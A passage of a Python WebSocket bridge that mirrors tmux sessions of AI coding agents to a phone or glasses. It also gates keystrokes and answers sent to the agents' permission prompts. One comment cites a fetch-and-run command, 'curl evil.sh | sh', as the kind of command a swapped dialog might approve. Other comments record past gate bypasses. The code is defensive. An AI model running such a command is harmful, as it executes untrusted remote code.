                    })
                except Exception:
                    pass
                break
            raw = stdout.decode("utf-8", errors="replace")
            lines = raw.splitlines()

            # tmux capture-pane returns the full pane height worth of rows,
            # which usually means lots of blank rows below the cursor when
            # the prompt sits mid-pane. iOS scrolls to count-1 to "show the
            # bottom" — if those rows are blank, the user has to scroll up
            # to find the actual content. Trim trailing whitespace-only
            # rows here so the last entry is always meaningful.
            while lines and not lines[-1].strip():
                lines.pop()

            # Detect a multi-row pixel-art icon at the top (Claude Code's
            # mascot, Codex emblems, etc.). When present, hold those rows
            # aside before the divider/long-run passes so the leading
            # block-element chars survive — the art is part of what the
            # user wants to see, not chrome to strip. Returns 0 (= no
            # art held) for the common case where the buffer has scrolled
            # past the icon, and the loop processes lines as before.
            lines = lines if mode == "ansi" else _apply_chrome_filters(lines)

            # --- Transcript scrollback splice -----------------------------
            # When a transcript JSONL exists for this session, prepend the
            # rendered conversation (deep history) and keep only the last
            # _TRANSCRIPT_LIVE_TAIL_ROWS of the live tmux screen as the "live"
            # tail. Scrolling up on the phone then walks the whole chat log;
            # the bottom stays live. The change-detection below still works:
            # the history block is byte-identical from the mtime cache on a
            # steady state (cheap diff, no re-parse), and only the tmux tail
            # varies poll-to-poll. No transcript → `lines` is the plain tmux
            # mirror, exactly as before (zero regression).
            if _TRANSCRIPT_SCROLLBACK_ENABLED:
                if transcript_path is None and time.monotonic() >= transcript_retry_at:
                    transcript_path = find_transcript_path(session)
                    transcript_retry_at = time.monotonic() + 5.0
                if transcript_path:
                    # render_transcript_cached is sync file I/O — run it off the
                    # event loop so the 2 Hz poll stays responsive under many
                    # concurrent subscribers.
                    history = await asyncio.to_thread(
                        render_transcript_cached,
                        transcript_path,
                        assistant=transcript_assistant,
                        max_lines=_TRANSCRIPT_MAX_LINES,
                    )
                    if history:
                        tail = lines[-_TRANSCRIPT_LIVE_TAIL_ROWS:]
                        lines = history + ["", _TRANSCRIPT_SEPARATOR, ""] + tail

            # NOTE: the change-detection comparison below runs on the
            # POST-TRIM `lines`. That's intentional: an intermediate state
            # whose only delta is trailing whitespace below the cursor row
            # collapses to the same trimmed snapshot and we suppress the
            # send. iOS would render the same trimmed tail anyway, so the
            # suppression is a wire-cost optimization, not lost data.
            #
            # Two-tier change detection: since the animated working line
            # ("✻ Cogitating… (5m 42s)") now stays IN the payload, its ticking
            # elapsed would otherwise defeat suppression and resend the whole
            # spliced payload at 2 Hz for the entire duration of every turn
            # (HMAC + JSON parse + SwiftUI tick on the phone, twice a second).
            # So: compare CONTENT with the working rows stripped — a real
            # change sends immediately; a timer-only tick resends at a relaxed
            # cadence so the visible timer still advances without the 2 Hz cost.
            content_key = _strip_working_status_rows(lines)
            now_mono = time.monotonic()
            real_change = last_content_key is None or content_key != last_content_key
            timer_tick = (not real_change) and lines != last_raw_lines
            if real_change or (timer_tick and now_mono - last_sent_at >= _WORKING_TICK_RESEND_SECONDS):
                last_content_key = content_key
                last_raw_lines = lines
                last_sent_at = now_mono

                # Outbound size guard: iOS's URLSessionWebSocketTask receive
                # cap is 1 MiB per message. The transcript history is already
                # byte-bounded in transcript_render, but the PLAIN tmux path
                # (no transcript) can still capture 2000 ANSI-heavy rows whose
                # JSON encoding (ESC → , 6 chars) could exceed the cap —
                # which would wedge the phone in a receive-fail/reconnect
                # loop. Drop oldest lines until comfortably under.
                send_lines = lines
                total = sum(len(ln) for ln in send_lines)
                if total > _MAX_OUTBOUND_CONTENT_CHARS:
                    budget = _MAX_OUTBOUND_CONTENT_CHARS
                    kept: list[str] = []
                    for ln in reversed(send_lines):
                        budget -= len(ln)
                        if budget <= 0:
                            break
                        kept.append(ln)
                    kept.reverse()
                    send_lines = ["… (older output trimmed) …"] + kept

                try:
                    await send_signed(ws,{
                        "type": "terminal_content",
                        "session_id": session_id,
                        "lines": send_lines,
                        "mode": mode,
                    })
                except Exception:
                    break

            # 500ms cadence (down from 1.0s) so streaming output on the
            # glasses lens feels live. The user explicitly reported the
            # lens "doesn't auto-scroll" — the snapshot was correct (always
            # the latest 23 rows) but updates only arrived once per second,
            # which reads as stale during a fast-typing or streaming
            # response. 2 Hz is well within the WS rate budget, the iOS
            # `terminal_content` handler is on the critical-bypass list,
            # and tmux capture-pane is cheap (<10 ms typical). Don't go
            # below 500 ms without revisiting subprocess CPU cost across
            # multi-session subscribers.
            await asyncio.sleep(0.5)
    except asyncio.CancelledError:
        pass


async def _handle_terminal_subscribe(data: dict, ws: WebSocket) -> None:
    """Start polling tmux for a session and streaming to the subscriber."""
    session_id = data.get("session_id", "")
    mode = _coerce_terminal_mode(data.get("mode"))
    session = sessions.get_session(session_id)
    if not session or not session.tmux_target:
        # MUST be terminal_error (not generic "error") so iOS clears the
        # "Connecting to terminal…" spinner. The generic error path only
        # surfaces a transcript toast and leaves the pager stranded.
        try:
            await send_signed(ws,{
                "type": "terminal_error",
                "session_id": session_id,
                "message": f"No tmux target for session '{session_id}'",
            })
            # Send fresh state_sync so iOS can remove the stale session
            await send_signed(ws,_state_sync_msg())
        except Exception:
            pass
        return
    target, tmux_err = _validate_tmux_pane_target(session.tmux_target)
    if tmux_err or not target:
        try:
            await send_signed(ws,{
                "type": "terminal_error",
                "session_id": session_id,
                "message": f"Invalid tmux target for session '{session_id}'",
            })
        except Exception:
            pass
        return

    # Geometry: an `ansi` subscriber may size the pane to its panel so the
    # assistant TUI reflows to the width it is actually being read at. Only
    # `ansi` clients do this -- the phone and the lens render whatever size
    # they are handed and must never resize the pane out from under the
    # terminal the user has open on their Mac.
    if mode == "ansi":
        geometry = _coerce_terminal_geometry(data)
        if geometry is not None:
            cols, rows = geometry
            if await _acquire_geometry(session_id, target, ws, cols, rows):
                log_event("info", session.project,
                          f"Terminal geometry {cols}x{rows}: {session_id[:12]}...")
            else:
                # Say so. A refused resize used to be silent, which meant the
                # pane kept a width the client had stopped drawing at: content
                # arrived 156 columns wide for a panel rendering 78, cut or
                # wrapped, with nothing anywhere to explain it. The client can
                # now narrow its own render to match instead of guessing.
                actual = await _read_window_geometry(target)
                try:
                    await send_signed(ws, {
                        "type": "terminal_error",
                        "session_id": session_id,
                        "message": (
                            f"geometry {cols}x{rows} not applied; pane is "
                            f"{actual[0]}x{actual[1]}" if actual else
                            f"geometry {cols}x{rows} not applied"
                        ),
                    })
                except Exception:
                    pass

    # NOTE: we deliberately do NOT raise this pane's tmux history-limit here.
    # tmux fixes a pane's history_limit at CREATION time, so `set-option
    # history-limit` on an already-running pane is a no-op for its buffer —
    # verified: `display-message -p '#{history_limit}'` still reports 2000 right
    # after the set, even for lines added afterward. And Claude/Codex panes
    # render in the alternate screen with zero scrollback anyway (see
    # _TERMINAL_CAPTURE_LINES); their deep history comes from the transcript
    # JSONL, not this capture. So there is nothing useful to set on subscribe —
    # a per-subscribe `set-option` subprocess would just burn a spawn for no
    # effect. If deep tmux scrollback is ever wanted for a plain-shell pane,
    # set history-limit when the pane is CREATED, not here.

    # Idempotent: if an active poll loop already exists for this
    # (session_id, ws) pair and hasn't finished, leave it running. The
    # iOS app routinely double-subscribes — TerminalPagerView.onAppear
    # eagerly subscribes the initial session, then TerminalView's .task
    # subscribes again when the inner view appears. Restarting the task
    # would throw away the existing `last_snapshot`, cancel the running
    # capture-pane subprocess, and force iOS to wait another full poll
    # cycle for content. Treating a duplicate subscribe as a no-op keeps
    # the first iteration's snapshot in flight and shaves a poll cycle
    # off the "Connecting to terminal…" wait.
    async with _terminal_subs_lock:
        existing = _terminal_subs.get(session_id, {}).get(ws)
        if existing is not None and not existing.task.done():
            if existing.mode == mode:
                log_event("info", session.project,
                          f"Terminal subscribe ignored (already active): {session_id[:12]}...")
                return
            # Mode switch on a live subscription (e.g. the same client moving
            # a pane from the phone mirror to a headset panel). The loop bakes
            # the mode in, so it has to restart -- one lost poll cycle, which
            # is cheaper than teaching the loop to re-read it mid-flight.
            log_event("info", session.project,
                      f"Terminal mode {existing.mode} -> {mode}: {session_id[:12]}...")
            existing.task.cancel()
        elif existing is not None:
            # Tombstone from a loop that finished/errored -- cancel and restart.
            existing.task.cancel()

        task = asyncio.create_task(_terminal_poll_loop(session_id, ws, mode))
        _terminal_subs.setdefault(session_id, {})[ws] = TerminalSub(task=task, mode=mode)
    log_event("info", session.project,
              f"Terminal subscribed ({mode}): {session_id[:12]}...")


async def _handle_terminal_unsubscribe(data: dict, ws: WebSocket) -> None:
    """Stop streaming terminal content for a session."""
    session_id = data.get("session_id", "")
    await _release_geometry(session_id, ws)
    async with _terminal_subs_lock:
        subs = _terminal_subs.get(session_id)
        if subs and ws in subs:
            subs[ws].task.cancel()
            del subs[ws]
            if not subs:
                del _terminal_subs[session_id]
    log_event("info", "bridge", f"Terminal unsubscribed: {session_id[:12]}...")


async def _handle_terminal_send_keys(data: dict, ws: WebSocket) -> None:
    """Send key sequence to a session's tmux pane.

    Two payload shapes are accepted:

      A. **Choice commit** — ``{choice_index: N, choice_signature: ...}``.
         Server-side translation: bridge looks up the live ChoicePrompt,
         branches on ``input_mode`` ("number" → ``"<N+1>\\n"`` literal;
         "tui_select" → ``Down``/``Up`` × delta + ``Enter`` interpreted
         as tmux named keys). iOS sends a *semantic* commit (which
         option, with the gate signature) and never has to know the
         widget shape. Refuses if the signature doesn't match the live
         prompt — protects against the WS-arrival → MainActor race.

      B. **Raw keys** — ``{keys: "...", literal: bool}``. Used by the
         iPhone terminal pager. When ``literal`` is true, ``tmux
         send-keys -l`` sends character-by-character without
         interpreting key names. When false (default), ``keys`` is
         treated as a tmux key name (``"Down"`` sends the Down arrow
         escape, ``"Enter"`` sends Return, etc.).

    Optional ``choice_signature`` on the raw-keys path retains the
    legacy gate behavior so older iOS clients (still sending
    ``keys: "<N>\\n"`` for choice commits) keep working.
    """
    session_id = data.get("session_id", "")

    # ------------------------------------------------------------------
    # Branch A0: multi-question form action (server-side keystroke synth).
    # ------------------------------------------------------------------
    if data.get("form_action") is not None:
        await _handle_form_action(data, ws, session_id)
        return

    # ------------------------------------------------------------------
    # Branch A: choice-commit with server-side keystroke synthesis.
    # ------------------------------------------------------------------
    choice_index = data.get("choice_index")
    if choice_index is not None:
        await _handle_choice_commit(data, ws, session_id)
        return

    # ------------------------------------------------------------------
    # Branch B: raw-keys (legacy / terminal pager).
    # ------------------------------------------------------------------
    keys = data.get("keys", "")
    raw_sequence = data.get("key_sequence")

    # `keys` and `key_sequence` are documented as mutually exclusive, and
    # `literal` as applying to `keys` only. Accepting a frame that carries both
    # is what let `literal` mean one thing to the gate and another to delivery.
    # Refusing the contradiction is clearer than picking a winner.
    if raw_sequence is not None and keys:
        await _form_error(
            ws, session_id,
            "Send either 'keys' or 'key_sequence', not both.",
        )
        return

    sequence = _coerce_key_sequence(raw_sequence)
    if raw_sequence is not None and sequence is None:
        # Explicitly rejected rather than silently ignored: an unknown key
        # name makes tmux exit non-zero and do nothing, and a keyboard whose
        # keystrokes vanish without explanation is worse than one that errors.
        try:
            await send_signed(ws, {
                "type": "error",
                "session_id": session_id,
                "message": "Invalid key_sequence",
            })
        except Exception:
            pass
        return
    if sequence is None and not keys:
        return

    if not isinstance(keys, str):
        # `len(keys)` below raised a TypeError out of the receive loop, which
        # catches only WebSocketDisconnect — so one malformed frame tore the
        # client's connection down.
        await _form_error(ws, session_id, "field 'keys' must be a string")
        return

    # Cap key input length to prevent abuse
    _MAX_KEYS_LEN = 10_000
    if len(keys) > _MAX_KEYS_LEN:
        keys = keys[:_MAX_KEYS_LEN]

    # A decision on screen may not be ANSWERED with raw keys. It may still be
    # dismissed, interrupted and scrolled, which is the distinction this gate
    # has to draw and did not.
    #
    # Two ways the first attempt was wrong, both found by review:
    #
    # - Too narrow. It consulted only `_LAST_CHOICE_FOR_SESSION`, and
    #   `activity._broadcast_question_form` *pops* that entry while a
    #   multi-question form is live ("a live form supersedes any single-choice
    #   tracking"). The two caches are mutually exclusive, so with an
    #   AskUserQuestion form on screen the gate saw nothing and `{"keys":
    #   "1\n"}` went straight through — the substitution this exists to stop.
    #
    # - Too broad. It refused every raw-key shape, including `Escape`, which is
    #   the only way to dismiss a choice prompt: the headset's `interrupt()` and the
    #   iPhone key bar both send it, and docs/api.md tells clients to prefer it
    #   over `stop_session` because a second Ctrl-C ends the session. Refusing it
    #   left a live prompt with no way out but the route the docs warn against.
    if _live_decision_for(session_id) is not None and _keys_would_answer(data):
        log_event(
            "warning", "bridge",
            f"Raw keys refused: a decision is open on {session_id[:12]}...",
        )
        await _form_error(
            ws, session_id,
            "A question is open in this session — answer it with choice_index, "
            "not raw keys. Escape or Ctrl-C still work.",
        )
        return

    # A commit that arrives with a signature when nothing is live is stale.
    if data.get("choice_signature"):
        await _form_error(
            ws, session_id, "Choice prompt no longer live — commit ignored."
        )
        return

    session = sessions.get_session(session_id)
    if not session or not session.tmux_target:
        try:
            await send_signed(ws,{
                "type": "error",
                "message": f"No tmux target for session '{session_id}'",
            })
        except Exception:
            pass
        return
    tmux_target, tmux_err = _validate_tmux_pane_target(session.tmux_target)
    if tmux_err or not tmux_target:
        try:
            await send_signed(ws,{
                "type": "error",
                "message": f"Invalid tmux target for session '{session_id}'",
            })
        except Exception:
            pass
        return

    literal = bool(data.get("literal", False))

    # A key_sequence is always interpreted (never -l): its members are tmux
    # key NAMES, which is the whole point of validating them.
    if sequence is not None:
        args, literal, shown = sequence, False, " ".join(sequence)
    else:
        args, shown = [keys], keys

    ok, err = await _send_tmux_keys(tmux_target, args, literal=literal)
    if not ok:
        log_event("error", session.project, f"Failed to send keys: {err}")
        try:
            # Generic message -- don't leak tmux stderr to the client.
            await send_signed(ws, {
                "type": "error",
                "session_id": session_id,
                "message": "Keys not delivered (pane may be gone)",
            })
        except Exception:
            pass
        return
    log_event("info", session.project, f"Sent keys: {shown}{' (literal)' if literal else ''}")


async def _handle_choice_commit(data: dict, ws: WebSocket, session_id: str) -> None:
    """Server-side keystroke synthesis for lens choice commits.

    Caller has already verified ``data["choice_index"] is not None``.
    Validates the signature gate, resolves the session's tmux target,
    re-detects the prompt against a FRESH capture so the focused_index
    used for arrow-nav delta math is current (the cached entry can be
    up to 1.5s stale — long enough for a keyboard arrow press at the
    real terminal to drift the cursor without us noticing), then
    dispatches the keystrokes based on ``input_mode``.
    """
    # Validate choice_index is a non-negative int (defend against
    # malformed payloads — type confusion attacks). Reject ``bool``
    # explicitly: ``bool`` is a subclass of ``int`` in Python, so
    # ``isinstance(True, int)`` is True — and ``True`` would silently
    # commit option 2 (since ``True + 1 == 2``) for any hostile or
    # malformed client. The explicit reject closes that bypass.
    raw_index = data.get("choice_index")
    if (
        isinstance(raw_index, bool)
        or not isinstance(raw_index, int)
        or raw_index < 0
    ):
        try:
            await send_signed(ws, {
                "type": "error",
                "session_id": session_id,
                "message": "Invalid choice_index — must be a non-negative integer.",
            })
        except Exception:
            pass
        return
    choice_index = raw_index

    expected_sig = data.get("choice_signature")
    if not expected_sig:
        # Choice-index commits without a signature would bypass the
        # race gate entirely — refuse so a malformed client can't
        # send arbitrary picks.
        try:
            await send_signed(ws, {
                "type": "error",
                "session_id": session_id,
                "message": "Choice commit requires choice_signature.",
            })
        except Exception:
            pass
        return

    session = sessions.get_session(session_id)
    if not session or not session.tmux_target:
        try:
            await send_signed(ws, {
                "type": "error",
                "message": f"No tmux target for session '{session_id}'",
            })
        except Exception:
            pass
        return
    tmux_target, tmux_err = _validate_tmux_pane_target(session.tmux_target)
    if tmux_err or not tmux_target:
        try:
            await send_signed(ws, {
                "type": "error",
                "message": f"Invalid tmux target for session '{session_id}'",
            })
        except Exception:
            pass
        return

    # Re-detect against a fresh capture so the focused_index is the one
    # the prompt currently has on screen, not whatever the activity
    # poll cached up to 1.5s ago. Closes two race windows the code
    # reviewer flagged:
    #   1. Stale-prompt commits: if the prompt scrolled off but the
    #      hysteresis miss-counter hasn't yet tripped cancellation,
    #      the cached prompt would have committed against whatever is
    #      currently on screen (e.g. an idle `❯` shell prompt — Down
    #      arrow recalls history, Enter resubmits).
    #   2. Cursor drift: keyboard arrow presses at the real terminal
    #      move the TUI cursor without invalidating the signature
    #      (focused_index is excluded from the hash on purpose). A
    #      fresh re-detect picks up the current cursor row so the
    #      delta math sends the right number of arrows.
    fresh = await _capture_and_detect_choice(tmux_target)
    if fresh is None or fresh.signature != expected_sig:
        try:
            await send_signed(ws, {
                "type": "error",
                "session_id": session_id,
                "message": "Choice prompt no longer live — commit ignored.",
            })
        except Exception:
            pass
        return

    #   3. A DIFFERENT prompt wearing the same signature. The two checks above
    #      both key on `signature`, which covers the title and option labels
    #      only -- boilerplate on a permission dialog -- so they cannot tell
    #      "approve `git status`" from "approve `curl evil.sh | sh`". Comparing
    #      what is on screen now against what the user was last SHOWN (the
    #      cached prompt, body included) is the check that distinguishes them.
    #      Enforced server-side rather than by trusting an echoed value, so it
    #      protects older clients that only know about `choice_signature`.
    if not _commit_matches_shown(session_id, fresh):
        log_event(
            "warning", session.project,
            "Choice commit refused: the prompt on screen is not the one that was shown",
        )
        await _form_error(
            ws, session_id,
            "The prompt on screen changed — nothing was answered. Look again.",
        )
        return

    # Clamp choice_index to the live option count — protects against a
    # racing prompt update where iOS picked option 6 of an old 6-option
    # list but the new prompt only has 4 options. Signature gate above
    # would already catch a count change (signature includes options),
    # so this is belt-and-suspenders.
    if not fresh.options:
        return
    choice_index = max(0, min(choice_index, len(fresh.options) - 1))

    project = session.project
    if fresh.input_mode == "tui_select":
        await _send_tui_choice(tmux_target, fresh, choice_index, project)
    else:
        # "number" mode (default / legacy inline prompt) — send the
        # 1-based option number followed by Enter, character-literal.
        keys = f"{choice_index + 1}\n"
        try:
            proc = await asyncio.create_subprocess_exec(
                "tmux", "send-keys", "-t", tmux_target, "-l", "--", keys,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
                env=get_subprocess_env(),
            )
            await proc.wait()
            log_event("info", project,
                      f"Committed choice {choice_index + 1} (number mode)")
        except Exception as exc:
            log_event("error", project, f"Failed to commit choice: {exc}")


async def _capture_clean_lines(tmux_target: str) -> list[str] | None:
    """Capture the pane (last ~30 rows), strip ANSI, return clean lines.

    Shared by the choice and form re-detect paths so a commit acts on the
    pane's CURRENT contents, not a cached snapshot.
    """
    from bridge.validation import _ANSI_RE

    try:
        proc = await asyncio.create_subprocess_exec(
            "tmux", "capture-pane", "-t", tmux_target,
            "-p", "-S", "-30",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
            env=get_subprocess_env(),
        )
        stdout, _ = await proc.communicate()
        if proc.returncode != 0:
            return None
        raw = stdout.decode("utf-8", errors="replace")
        clean = _ANSI_RE.sub("", raw) if raw else ""
        if not clean:
            return None
        return clean.splitlines()
    except Exception:
        return None


#: Frame fields every handler reads with ``data.get("<field>", "")`` and then
#: treats as a string -- slicing it, lowercasing it, regex-matching it, or using
#: it as a dict key. The ``""`` default only applies to a MISSING key, so any
#: other type arrives intact.
_FRAME_STRING_FIELDS = ("session_id", "tmux_session", "project", "task_id")


def _frame_string_fields_ok(frame: dict) -> bool:
    """True unless this frame carries one of those fields with a non-string value.

    Every handler takes them straight off the frame and treats them as strings,
    so a wrong type raises out of the handler -- and that is not
    ``WebSocketDisconnect``, so it escapes the receive loop: the client is
    dropped, losing its terminal subscriptions and its geometry lease, and the
    developer's tmux pane stays at panel width. Measured instances:

    * ``{"session_id": []}`` -> "unhashable type: 'list'" in ``get_session``;
    * ``{"session_id": null}`` -> ``None[:12]`` in ``_handle_terminal_unsubscribe``;
    * ``{"tmux_session": 5}`` -> "expected string or bytes-like object" in
      ``_is_safe_tmux_target``;
    * ``{"tmux_session": {}}`` -> "unhashable type: 'dict'".

    ``None`` is REJECTED, which an earlier version of this allowed on the
    reasoning that it "already means absent everywhere downstream". That was
    simply untested and false -- see the ``[:12]`` above. No client sends it:
    iOS omits the key when the value is nil (``App/Models.swift``) and the
    Kotlin builders take a non-null ``String``.

    Checked once where frames arrive rather than in each handler, because that
    is the only place that does not rely on the next handler remembering.
    """
    for field in _FRAME_STRING_FIELDS:
        if field in frame and not isinstance(frame[field], str):
            return False
    return True


def _live_choice_for(session_id: str) -> "ChoicePrompt | None":
    """The choice prompt this session last broadcast, or None.

    The id is type-checked because it comes straight from a client frame: an
    unhashable one (``{"session_id": []}``) made the dict lookup raise, and that
    escapes a receive loop which catches only WebSocketDisconnect.
    """
    if not isinstance(session_id, str):
        return None
    from bridge.activity import _LAST_CHOICE_FOR_SESSION

    return _LAST_CHOICE_FOR_SESSION.get(session_id)


def _live_decision_for(session_id: str) -> "ChoicePrompt | MultiQuestionForm | None":
    """Any decision this session last broadcast -- a choice prompt OR a form.

    Both caches have to be consulted, because they are mutually exclusive:
    ``activity._broadcast_question_form`` pops the choice entry when a form goes
    up, so asking only about choices reads "nothing on screen" for the entire
    life of an AskUserQuestion form.
    """
    if not isinstance(session_id, str):
        return None
    from bridge.activity import _LAST_CHOICE_FOR_SESSION, _LAST_FORM_FOR_SESSION

    return (
        _LAST_CHOICE_FOR_SESSION.get(session_id)
        or _LAST_FORM_FOR_SESSION.get(session_id)
    )


#: Named tmux keys that cannot answer a widget: they dismiss it, interrupt the
#: agent, or move the view. Everything else -- Enter above all -- can.
#:
#: `BTab` is deliberately NOT here, though it looks like navigation and the
#: iPhone key bar offers it as "S-Tab": Claude Code's ExitPlanMode prompt is
#: anchored on the footer "shift+tab to approve with this feedback", so
#: shift-tab APPROVES a plan. Listing it meant a client could approve one while
#: skipping the commit path's shown-prompt check entirely. `Tab` is absent for
#: the same reason even though it only navigates -- the pair should behave alike,
#: and the key bar still works whenever no decision is open.
#:
#: `C-d` and `C-g` are also absent: no client sends them for navigation, and
#: C-d is EOF, which is not something to wave through at a live prompt.
_NON_ANSWERING_KEYS = frozenset({
    "escape", "c-c", "pageup", "pagedown", "ppage", "npage",
    "home", "end", "up", "down", "left", "right",
})


def _keys_would_answer(data: dict) -> bool:
    """True when this raw-key payload could commit an answer to a widget.

    ``Enter`` is what confirms the highlighted row, and literal text typed into a
    select widget is ignored except that the Enter after it confirms whatever the
    cursor is on -- which is how a ``/deny`` once approved the command it meant
    to refuse. Arrow keys move the cursor but commit nothing, and the commit path
    re-reads the cursor from a fresh capture, so they are safe to pass through.
    """
    raw_sequence = data.get("key_sequence")
    names = []
    if isinstance(raw_sequence, list):
        names.extend(str(k) for k in raw_sequence)
    keys = data.get("keys")
    if isinstance(keys, str) and keys:
        names.append(keys)

    # `literal` only ever described `keys` (docs/api.md: "Applies to `keys`
    # only"; "key_sequence is always interpreted"). Returning on it was a
    # complete bypass: with `literal: true` and no `keys`, this answered
    # `bool(None)` -> False and the gate was skipped, while the handler went on
    # to deliver `key_sequence` interpreted -- it overrides literal to False
    # there. So `literal` decided the security question and was ignored for
    # delivery, and `{"literal": true, "key_sequence": ["Enter"]}` pressed Enter
    # on a live permission dialog. Judge the keys that will actually be sent.
    if data.get("literal") and not names:
        # Typing with no named keys. The text is discarded by the widget; the
        # risk is the Enter that arrives with or after it.
        return bool(keys)
    if data.get("literal") and isinstance(keys, str) and keys:
        # Literal text is never navigation, whatever it spells.
        return True

    for name in names:
        candidate = name.strip().lower()
        if candidate and candidate not in _NON_ANSWERING_KEYS:
            return True
    return False


def _commit_matches_shown(session_id: str, fresh: "ChoicePrompt") -> bool:
    """True when *fresh* is the prompt this session last broadcast to clients.

    The cached entry is what the lens card was built from, so its ``commit_key``
    is a fingerprint of what the human read. A mismatch means the dialog was
    replaced between the card going up and the answer coming back, and the
    answer belongs to a prompt nobody approved.

    No cached prompt means nothing was ever shown for this session, so there is
    nothing a human could have been deciding about -- refuse.
    """
    shown = _live_choice_for(session_id)
    if shown is None:
        return False
    return getattr(shown, "commit_key", None) == getattr(fresh, "commit_key", None)


async def _capture_and_detect_choice(tmux_target: str) -> "ChoicePrompt | None":
    """Capture the pane and run ``detect_choice_prompt`` against it.

    Returns the freshly-detected ``ChoicePrompt`` (with current
    ``focused_index``) or None if no prompt is on screen. Used by
    ``_handle_choice_commit`` to close the stale-snapshot window the
    cached ``_LAST_CHOICE_FOR_SESSION`` can leave open.

    Imports ``detect_choice_prompt`` lazily to break the
    ws_handler → choice_detector → activity import cycle (activity
    already imports ws_handler indirectly via the dispatch path).
    """
    from bridge.choice_detector import detect_choice_prompt

    lines = await _capture_clean_lines(tmux_target)
    if lines is None:
        return None
    return detect_choice_prompt(lines)


async def _capture_and_detect_form(tmux_target: str):
    """Capture the pane and run ``detect_question_form`` against it.

    Returns the freshly-detected ``MultiQuestionForm`` (with current
    ``focused_index`` for arrow-delta math) or None. Used by
    ``_handle_form_action`` so the keystroke synthesis acts on the
    screen as it is RIGHT NOW (the form may have advanced, or the cursor
    drifted via a keyboard arrow, since the lens card was broadcast).
    """
    from bridge.choice_detector import detect_question_form

    lines = await _capture_clean_lines(tmux_target)
    if lines is None:
        return None
    return detect_question_form(lines)


async def _form_error(ws: WebSocket, session_id: str, message: str) -> None:
    try:
        await send_signed(ws, {
            "type": "error",
            "session_id": session_id,
            "message": message,
        })
    except Exception:
        pass


async def _tmux_send_keys(
    tmux_target: str, keys: list[str], literal: bool = False
) -> None:
    """Send a key sequence to a tmux pane. ``literal`` types the keys
    character-by-character (``-l``); otherwise each element is a tmux key
    NAME ("Down", "Up", "Enter")."""
    cmd = ["tmux", "send-keys", "-t", tmux_target]
    if literal:
        cmd.append("-l")
    cmd.append("--")  # see _send_tmux_keys: a "-"-leading payload is a flag
    cmd.extend(keys)
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
        env=get_subprocess_env(),
    )
    await proc.wait()


_FORM_ACTIONS = frozenset({"select", "toggle", "advance", "note", "submit", "cancel"})


def _resolve_form_target(fresh, action: str, data: dict) -> int | None:
    """Resolve a form action to a target row index within ``fresh.rows``.

    ``select``/``toggle`` carry a ``row_index`` into the pickable (non-meta)
    rows iOS was shown; the other actions target a control row by kind.
    """
    rows = fresh.rows
    if action in ("select", "toggle"):
        raw = data.get("row_index")
        if isinstance(raw, bool) or not isinstance(raw, int) or raw < 0:
            return None
        pickable = [i for i, r in enumerate(rows) if r.kind != "meta"]
        if raw >= len(pickable):
            return None
        return pickable[raw]
    kind = {
        "note": "free_text",
        "advance": "next",
        "submit": "submit",
        "cancel": "cancel",
    }.get(action)
    if kind is None:
        return None
    for i, r in enumerate(rows):
        if r.kind == kind:
            return i
    return None


async def _handle_form_action(data: dict, ws: WebSocket, session_id: str) -> None:
    """Drive one step of a multi-question AskUserQuestion form.

    iOS sends a SEMANTIC action; the bridge re-detects the live form, gates
    on (form_id + active-question title) so a stale lens card can't act on
    the wrong screen, then synthesizes the verified keystrokes (all
    arrow-deltas from the freshly-observed cursor, like ``_send_tui_choice``):

      - "select"  single-select: arrow to option + Enter (auto-advances)
      - "toggle"  multi-select:  arrow to option + Enter (toggles the box)
      - "advance" multi-select:  arrow to the "Next" row + Enter
      - "note"    free text:     arrow to "Type something" + type text + Enter
      - "submit"  review screen: arrow to "Submit answers" + Enter
      - "cancel"  review screen: arrow to "Cancel" + Enter

    The (form_id + title) gate — rather than the full signature — lets
    rapid multi-select toggles through: toggling a box changes the
    signature but not the active question, so successive toggles on the
    same screen are still accepted.
    """
    action = data.get("form_action")
    if action not in _FORM_ACTIONS:
        await _form_error(ws, session_id, f"Unknown form action: {action!r}")
        return
    expected_form_id = data.get("form_id")
    expected_title = data.get("title")
    if not expected_form_id:
        await _form_error(ws, session_id, "Form action requires form_id.")
        return

    session = sessions.get_session(session_id)
    if not session or not session.tmux_target:
        await _form_error(ws, session_id, f"No tmux target for session '{session_id}'")
        return
    tmux_target, tmux_err = _validate_tmux_pane_target(session.tmux_target)
    if tmux_err or not tmux_target:
        await _form_error(ws, session_id, f"Invalid tmux target for session '{session_id}'")
        return

    fresh = await _capture_and_detect_form(tmux_target)
    if (
        fresh is None
        or fresh.form_id != expected_form_id
        or (expected_title and fresh.title != expected_title)
    ):
        await _form_error(ws, session_id, "Form screen changed — action ignored.")
        return

    # Resolve note text BEFORE any keystroke: pressing Enter on an EMPTY
    # "Type something" row declines the whole form (verified in the spike),
    # so an empty note must bail rather than send a bare Enter.
    note_text = ""
    if action == "note":
        # _sanitize_dispatch_text, not _sanitize_message: this is typed into a
        # pane with `send-keys -l` and confirmed with a separate Enter, and
        # _sanitize_message keeps CR/LF — an embedded newline submits early and
        # the remainder lands on whatever screen comes next. On an
        # AskUserQuestion review screen the highlighted row is "Submit answers".
        note_text = _sanitize_dispatch_text(data.get("text", ""))[:500]
        if not note_text:
            await _form_error(ws, session_id, "Empty note — nothing to dictate.")
            return

    target_idx = _resolve_form_target(fresh, action, data)
    if target_idx is None:
        await _form_error(
            ws, session_id, f"Form action '{action}' has no target on this screen."
        )
        return

    focused = fresh.focused_index if fresh.focused_index is not None else 0
    focused = max(0, min(focused, len(fresh.rows) - 1))
    delta = target_idx - focused
    nav_keys = ["Down"] * delta if delta > 0 else ["Up"] * (-delta)

    project = session.project
    try:
        if nav_keys:
            await _tmux_send_keys(tmux_target, nav_keys)
        if action == "note":
            # Focus is now on the "Type something" row — type inline, then
            # Enter confirms (verified keystroke model).
            await _tmux_send_keys(tmux_target, [note_text], literal=True)
        await _tmux_send_keys(tmux_target, ["Enter"])
        log_event(
            "info", project,
            f"Form action '{action}' → row {target_idx} (delta {delta} from {focused})"
        )
    except Exception as exc:
        log_event("error", project, f"Form action '{action}' failed: {exc}")
        await _form_error(ws, session_id, "Failed to send form keys.")


async def _send_tui_choice(
    tmux_target: str,
    live,  # ChoicePrompt — typed in choice_detector.py
    choice_index: int,
    project: str,
) -> None:
    """Arrow-navigate to ``choice_index`` and press Enter.

